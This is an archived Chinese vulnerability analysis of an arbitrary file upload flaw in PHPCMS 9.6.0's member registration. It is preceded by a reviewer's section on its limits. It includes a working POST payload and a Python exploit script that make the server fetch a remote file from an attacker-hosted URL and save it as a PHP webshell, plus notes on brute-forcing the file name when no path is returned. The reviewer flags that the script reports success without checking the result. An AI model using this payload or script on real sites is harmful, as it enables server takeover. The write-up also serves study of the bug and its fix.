---
source: "MrWQ/vulnerability-paper"
product: "PHPCMS9.6.0"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PHPCMS V9-6-0 任意文件上传漏洞分析"
prerequisites: "来源所述条件，未列明部分仍待核：注册与choosemodel启用、modelid能选到editor content、远程copy/allow_url_fopen、上传目录执行PHP；路径回显需注册成功进入缺列SQL错误"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/f4MghsGAzHkeu62_5cp0VA"
id: "vw-6c4c794549fdf40465868363"
entity_id: "ve-6c4c794549fdf40465868363"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：注册与choosemodel启用、modelid能选到editor content、远程copy/allow_url_fopen、上传目录执行PHP；路径回显需注册成功进入缺列SQL错误

- **适用与权限边界（1）**：正文PoCmodelid11脚本modelid1，正常流程10，模型配置映射至关重要但没解释1与11差别，不能把任意ID视通用。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：脚本无返回仍打印success，正则贪婪匹配img且无实际执行验证；用户名/邮箱随机碰撞可能导致不回路径。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：正常birthday INSERT出现'2021-03-13'php是文本污染。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：详述phpsso故障/重复用户不回路径与文件已写区别，应保留；9.6.1修复仅图可补官方出处。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PHPCMS V9-6-0 任意文件上传漏洞分析

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/f4MghsGAzHkeu62_5cp0VA)

前言
--

PHPCMS 是一款网站管理软件。该软件采用模块化开发, 支持多种分类方式。

环境搭建
----

本次 PHPCMS 版本为`9.6.0`, 安装步骤跟上一篇文章一样，参考 [PHPCMS_V9.2 任意文件上传 getshell 漏洞分析](https://mp.weixin.qq.com/s?__biz=MzU4NTY4MDEzMw==&mid=2247489053&idx=1&sn=de7468d2e9605a23aab7f21bc1c31ae4&scene=21#wechat_redirect)

漏洞复现
----

在注册用户处，添加用户进行抓包（这里以 Tao 为例）

![](../../.resource/remote/88f0fec9458a1e8c671b1975bcabbfd9c97546a8a829d2c38dfb59981d9fefd4.png)

```
#poc
siteid=1&modelid=11&username=Tao&password=123456&email=Tao@qq.com&info[content]=<img src=http://www.tao.com/t.txt?.php#.jpg>&dosubmit=1&protocol=
# http://www.tao.com/t.txt显示的内容为你要上传的文件内容
```

本次测试中, `http://www.tao.com/t.txt`文本内容如下：

![](../../.resource/remote/b02f29c74fc637d18d4dcdf7a6bad7ad2086a702f03a7148517724919cf83099.png)

修改，放包回显如下，然后我们访问该返回的 url

![](../../.resource/remote/3e2ac6d1cedee36ea9c46850286e4ce207154848ce0993b57702351133c10642.png)

![](../../.resource/remote/42419ce290fe558aa8e2e3e161c588478b3b43cb4c38b109ee136ca899402e38.png)

利用成功！！！这里再贴个脚本

```
'''
Author: Tao
'''
import requests
import re
import random
import sys

def anyfile_up(surl,url):
   url = "{}/index.php?m=member&c=index&a=register&siteid=1".format(url)
   data = {
       'siteid': '1',
       'modelid': '1',
       'username': 'Tao{}'.format(random.randint(1,9999)),
       'password': '123456',
       'email': 'Tao{}@xxx.com'.format(random.randint(1,9999)),
       'info[content]': '<img src={}?.php#.jpg>'.format(surl),
       'dosubmit': '1',
       'protocol': ''
  }
   r = requests.post(url, data=data)
   return_url = re.findall(r'img src=(.*)>',r.text)
   if len(return_url):
       return return_url[0]
if __name__ == '__main__':
   if len(sys.argv) == 3:
       return_url = anyfile_up(sys.argv[1],sys.argv[2])
       print('seccess! upload file url: ', return_url)
   else:
       message = \
       """
      python3 anyfile_up.py [上传内容URL地址] [目标URL]
      example: python3 anyfile_up.py http://www.tao.com/shell.txt http://www.phpcms96.com
      """
       print(message)
```

运行效果如下图：

![](../../.resource/remote/f408b1db6ad5db24afc960f51f87570165ad03da5bd070d73bba5b5aa60da12b.png)

漏洞分析
----

这个漏洞存在于用户注册处，通过上面请求的地址（`/index.php?m=member&c=index&a=register&siteid=1`）, 定位处理请求的函数为`register`, 位于文件`phpcms/modules/member/index.php`33 行处。

为了更好的理解漏洞的原理和利用的巧妙之处，我们就先看看正常的注册流程。

```
// 61-79
$userinfo = array();
$userinfo['encrypt'] = create_randomstr(6);

$userinfo['username'] = (isset($_POST['username']) && is_username($_POST['username'])) ? $_POST['username'] : exit('0');
$userinfo['nickname'] = (isset($_POST['nickname']) && is_username($_POST['nickname'])) ? $_POST['nickname'] : '';

$userinfo['email'] = (isset($_POST['email']) && is_email($_POST['email'])) ? $_POST['email'] : exit('0');
$userinfo['password'] = (isset($_POST['password']) && is_badword($_POST['password'])==false) ? $_POST['password'] : exit('0');

$userinfo['email'] = (isset($_POST['email']) && is_email($_POST['email'])) ? $_POST['email'] : exit('0');

$userinfo['modelid'] = isset($_POST['modelid']) ? intval($_POST['modelid']) : 10;
$userinfo['regip'] = ip();
$userinfo['point'] = $member_setting['defualtpoint'] ? $member_setting['defualtpoint'] : 0;
$userinfo['amount'] = $member_setting['defualtamount'] ? $member_setting['defualtamount'] : 0;
$userinfo['regdate'] = $userinfo['lastdate'] = SYS_TIME;
$userinfo['siteid'] = $siteid;
$userinfo['connectid'] = isset($_SESSION['connectid']) ? $_SESSION['connectid'] : '';
$userinfo['from'] = isset($_SESSION['from']) ? $_SESSION['from'] : '';
```

上面代码对用户信息进行了处理，130 行前的代码就是获取一下信息，分析这次漏洞来说意义不大。直接下断点到 130 行，然后`F9`跳到此处，代码如下：

```
if($member_setting['choosemodel']) {
   require_once CACHE_MODEL_PATH.'member_input.class.php';
   require_once CACHE_MODEL_PATH.'member_update.class.php';
   $member_input = new member_input($userinfo['modelid']);
   $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
   $user_model_info = $member_input->get($_POST['info']);// 135行，重点
```

走到 135 行，可以发现，这里`$_POST['info']`传入了`member_input`类中的`get`方法，跟进该方法。(该方法跳转至：`/caches/caches_model/caches_data/member_input.class.php`文件 20 行)

继续执行可发现，在这个`get`方法中，走到 47 行，获取了`datetime`函数，而 48 行也调用了该函数。

> 这里留一个问题，为什么 47 行处获取的是`datetime`这个函数？

![](../../.resource/remote/e71c755a1f312074648490e1abd930afd6d4a0e03b3c95fb5b440e896f570ffb.png)

跟进一下这个函数，代码如下：

![](../../.resource/remote/f52787e8aa570a7b9918f536ef47d73d74915bd1870cfd9609f4aa2ad862bf3f.png)

上面代码执行完以后，返回`$value="2021-03-13"`, 然后返回`get`方法，执行

```
$info[$field] = $value;
return $info;
```

退出`get`方法，继续跟进，进入`ps_member_register`方法

![](../../.resource/remote/f5b4737e6a4874c341f5e635c4b2ccfdd6965c0ed3ffac76347577a3f1f2b982.png)

继续跟进，执行`insert`操作

![](../../.resource/remote/01c8e63a2692b52cb542dfe28e2782a4cfee6c33672d73d6b1ef23797072bc55.png)

`F7`跟进, 执行到下图，将注册信息插入数据库，注册完成。

![](../../.resource/remote/67c6924c17b0cc5802b9c1c91399f71767fc326c85a59c60b209d3deb50cc9e3.png)

![](../../.resource/remote/086fe8a63e04fe2539cb4cf8e706c22acdb6b8bba21f5d69419c553760001b62.png)

之后返回到`register`函数

![](../../.resource/remote/d728a1c9b632b366b3038d751ac66abac6a717127e5be0498f5ecb9eff0448a1.png)

当`$status > 0`时，执行`insert`操作，这里将`生日日期`和`用户id`插入到`v9_member_detail`表中

![](../../.resource/remote/086fe8a63e04fe2539cb4cf8e706c22acdb6b8bba21f5d69419c553760001b62.png)

```
INSERT INTO `phpcmsv96`.`v9_member_detail`(`birthday`,`userid`) VALUES ('2021-03-13'php,'26')
```

到这里，我们肯定还是不知道为什么上面调用的函数是`datetime`, 先不急，我们整理一下注册的执行流程：

![](../../.resource/remote/d6b77c777a08c37d2739101bb9db1aecd546c3e275c108e514e29bd2a5a4af4c.png)

你是不是发现了什么？接下来我们来分析一下为什么`$func="datetime"`。

首先由于`$func = $this->fields[$field]['formtype']`，我们按 ctrl 点击`$this->fields`，同一文件，第 11 行得到的，这里传了个`'model_field_'.$modelid`, 而`$modelid = 10`，跟进一下`getcache`方法

![](../../.resource/remote/85ed7572c385ff1bbdcd6a666b89452a46adee33aabe1dd3bf517752ae3cc9e1.png)

跳转至`phpsso_server/phpcms/libs/functions/global.func.php`文件，函数内容如下:

```
function getcache($name, $filepath='', $type='file', $config='') {
if(!preg_match("/^[a-zA-Z0-9_-]+$/", $name)) return false;
if($filepath!="" && !preg_match("/^[a-zA-Z0-9_-]+$/", $filepath)) return false;
pc_base::load_sys_class('cache_factory','',0);
if($config) {
$cacheconfig = pc_base::load_config('cache');
$cache = cache_factory::get_instance($cacheconfig)->get_cache($config);
} else {
$cache = cache_factory::get_instance()->get_cache($type);
}
return $cache->get($name, '', '', $filepath);
}
```

因为`$config`未进行传参，默认为空，因此执行的是`$cache = cache_factory::get_instance()->get_cache($type);`, 执行`get_cahe`方法，传入参数`$type='file'`, 跟进一下此方法：

```
// phpcms/libs/classes/cache_factory.class.php 53行处
protected $cache_list = array();
public function get_cache($cache_name) {
if(!isset($this->cache_list[$cache_name]) || !is_object($this->cache_list[$cache_name])) {
$this->cache_list[$cache_name] = $this->load($cache_name);
}
return $this->cache_list[$cache_name];
}
```

`$cache_list`是个空数组，因此`$this->cache_list[$cache_name]`不存在，且不是对象。跟着会执行下面的代码，我们跟进一下`load`方法.

```
$this->cache_list[$cache_name] = $this->load($cache_name);
```

`load`方法代码如下：

```
public function load($cache_name) {
$object = null;
if(isset($this->cache_config[$cache_name]['type'])) {
switch($this->cache_config[$cache_name]['type']) {
case 'file' :
$object = pc_base::load_sys_class('cache_file');
break;
case 'memcache' :
define('MEMCACHE_HOST', $this->cache_config[$cache_name]['hostname']);
define('MEMCACHE_PORT', $this->cache_config[$cache_name]['port']);
```

由于`$cache_name = 'file'`, 从而执行`$object = pc_base::load_sys_class('cache_file');`, 跟进一下`pc_base::load_sys_class`方法

![](../../.resource/remote/818b1b9bd043584355eb8a508f78ecd3e2c10ee0eea6853b784e5a18c8380016.png)

调用了`_load_class`类，继续进入

![](../../.resource/remote/7073ddecf38371be321987e14b84bcc9dd51901afdd51b1133490ba5a84072ee.png)

122 行的代码不会执行，因为文件路劲中`没有自己的扩展文件`，`my_path`方法代码如下：

```
public static function my_path($filepath) {
$path = pathinfo($filepath);
if (file_exists($path['dirname'].DIRECTORY_SEPARATOR.'MY_'.$path['basename'])) {
return $path['dirname'].DIRECTORY_SEPARATOR.'MY_'.$path['basename'];
           // 没有 my_cache_file.class.php
} else {
return false;
}
}
```

上图执行到 130 行，返回了`cache_file`对象（因为`$name='cache_file'`），内容见下图：

![](../../.resource/remote/6662e7e51a673c848c6bc0fbed39633bf886857ae3ae5ca2b58a5e145e5b312d.png)

这里返回完了以后，退出到执行`phpsso_server/phpcms/libs/functions/global.func.php`中 548 行处`get`方法，代码如下：

![](../../.resource/remote/cb6139269a1fc17a4f8d99e32decdfd5469c20bd43af0fd103f785eaa8adb76a.png)

代码传入的参数`$name`就是下图的`'model_field_'.$modelid` = `'model_field_10'`：

![](../../.resource/remote/766293d22d2453947186960baad3044bb3eae39b33c684dd9a69426b7243a2d0.png)

看看 get 方法，可以发现，它包含了`/caches/caches_model/caches_data/model_field_10.cache.php`文件

![](../../.resource/remote/751bb95d4c920043f989dedfc5ef84a13bd6b1f0de6092414b549a48a9dc6f28.png)

且 91 行返回了`/caches/caches_model/caches_data/model_field_10.cache.php`中的内容

![](../../.resource/remote/5ec934cdf6e25c0fff2b1b35bb9545ffcfe1e1fd2f698a86e0e99a6b56fc1690.png)

内容如下：

![](../../.resource/remote/b0c619124be402fbd9f3812e8f18cd8eed4f01eb840a23d2424abee4e0d30ef3.png)

`$func = $this->fields[$field]['formtype'];` 对应此文件中`'formtype' => datetime`，因此这里`$func = datetime`。

当然，这里数据也可以通过数据库中`v9_member_field`表获取。

![](../../.resource/remote/a45cab3147a28a6c338a4e40ed1ff6f3ac62070a6a1ff06d3ca735d059d1c286.png)

![](../../.resource/remote/502d593c212e0f06e4220b835330025aec6744e97d7cf73d4dca4f1c4aaf6247.png)

可能上面描述的不太直观，我们再次梳理一下获取`datetime`函数的流程：

![](../../.resource/remote/fb0e3f7843ae4d40e1ecccde12910bb6ba33e52a72410af2200e561f40fc74cc.png)

![](../../.resource/remote/0c947488902256a29b5366eb6f40106d8020312558cabd67acaf19e28c96950f.png)

接下来我们分析 poc

> 注意：再一次使用 poc 的时候，我们需要保证`username`值和`email`是唯一的

通过上面的分析，直接下断点到关键处

![](../../.resource/remote/f15460268d4d7efdf40c4cc47e3c08ed72c3b36d225e0465e24ab11362ff9648.png)

如上图，这里获取的是`editor`函数，而在这个函数中，有个`download`方法 (下图，文件在`caches/caches_model/caches_data/member_input.class.php`)

![](../../.resource/remote/3886e54f927785c45fb54dbdd47731c54fa4fd1e91055a59a2342dc5da21b3f3.png)

![](../../.resource/remote/40b54218a496827fc432488044123ff2037238c93268abc373dc7b7eea91ca5f.png)

![](../../.resource/remote/309f64c7e690ff55893353f13568d5f7bcf68b2d642abe23e4699f3f7c14aa76.png)

上面关键代码如下：

```
$ext = 'gif|jpg|jpeg|bmp|png';
...
$string = new_stripslashes($value);
if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i",$string, $matches)) return $value;
```

这个正则匹配不难理解，需要满足`href/src=url. (gif|jpg|jpeg|bmp|png)`，这就是为什么我们写`info[content]=<img src=http://www.tao.com/a.txt?.php#.jpg`（符合这个格式，而且加`.jpg`的原因），接着进入`fillurl`方法

![](../../.resource/remote/319ecb40b504ec4d987382d089483ac2c65a7753fc1b2908d8282d07aa36fdc6.png)

![](../../.resource/remote/fd65e095d18a274bae7212c2ac136630a6fb42dbe7c24a9ec66f9d4dffca1c7f.png)

在上图的`fillurl`方法中, 通过下面代码去掉了锚点.

```
$pos = strpos($surl,'#');
if($pos>0) $surl = substr($surl,0,$pos);
```

`strpos`定位`#`, 然后使用`substr`处理`http://www.tao.com/t.txt?.php#.jpg`, 处理完之后`$surl = http://www.tao.com/t.txt?.php`。

继续执行，可以发现返回的 url 去掉了`#`后面的内容

![](../../.resource/remote/c0a73581b5130603fa2f7b428b96054eb0e42e64e6ecb0e379c8be76adf77e4f.png)

下面 166 行处获取了上面返回 url 的后缀，及`php`, 通过`getname`方法进行重命名，可以发现的是，`getname`方法返回的文件名也只是时间 + 随机的三位数。如果不返回上传文件的 url 地址，也可以通过爆破获取。

![](../../.resource/remote/f95ed19ef3bee3ed23f962fb26a6d34b86636fe3230089ede6fdbf6112f87a8a.png)

接着程序调用了`copy`函数, 对远程的 url 文件进行了下载

![](../../.resource/remote/ee8c7d580fe11494313720d41613e9c2b1f06738a03b7df26e785ad6f7f26747.png)

这里的`$this->upload_func`是`copy`函数的原因, 是因为初始化时赋给的（看下图）

![](../../.resource/remote/b070c8e68f66b764713902e2dd576d79f118ca4fbbbc2afebb1015f8794e307f.png)

此时能看到我们要写入的内容已经成功写入文件了。

![](../../.resource/remote/4d7e27a0708aa4f64547a03abf08857bb45bd4c97873da7960bd68eab9d82a49.png)

接着我们来看看写入文件的路劲是如何返回给我们的。上面程序执行完以后，回到了`register`函数中：

![](../../.resource/remote/6aa35a7e0429f09c58a1b42b09083e79dd31155749941ef70e7774130611d531.png)

F7 跟进

![](../../.resource/remote/187eb3dfb30b1b38c3a18b4818035b1e84246a953e61842123b06f9ce501296f.png)

```
INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES ('<img src=http://www.phpcms96.com/uploadfile/2021/0314/20210314103307168.php>','25')
```

可以发现，上上图 140 行处`$status > 0`时会执行上面的 SQL 语句，也就是向`v9_member_detail`的`content`和`userid`两列插入数据

![](../../.resource/remote/0d7681417b65ab75543a1ab31338c8f6103400e0e254f1ce6a3f3cddeab27fd9.png)

但是由于`v9_member_detail`表结构中没有`content`列，产生了报错。从而将插入数据中的 sql 报错语句 (包含 shell 路径) 返回了前台页面。

前面说 140 行`$status>0` 时才会执行 SQL 语句进行 INSERT 操作。我们来看一下什么时候`$status <= 0`, 不执行`insert`呢?

通过前面 139 行我们发现`$status`是由`client`类中`ps_member_register`方法返回的（函数路劲在：`phpcms/modules/member/classes/client.class.php` ）

![](../../.resource/remote/6fba687c502173fbb5c47ef2b8f71deb8278d2f81de2501c7d1b89a0c6549394.png)

`$status <= 0`都是因为用户名和邮箱不唯一导致的，所以我们 payload 尽量要随机

另外在 phpsso 没有配置好的时候`$status`的值为空，也同样不能得到路径

在无法得到路径的情况下我们只能爆破了 ，文件名的生成方法 (在`phpcms/libs/classes/attachment.class.php`)

![](../../.resource/remote/f95ed19ef3bee3ed23f962fb26a6d34b86636fe3230089ede6fdbf6112f87a8a.png)

返回的文件名也只是时间 + 随机的三位数。比较容易爆破的。

漏洞修复
----

在 phpcms9.6.1 中修复了该漏洞，修复方案就是对用`fileext`获取到的文件后缀再用黑白名单分别过滤一次

![](../../.resource/remote/784cb00fcd9266a425da98173a2d1cac3253370272798519e0788eaa42373b36.png)

文章中有什么不足和错误的地方还望师傅们指正。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
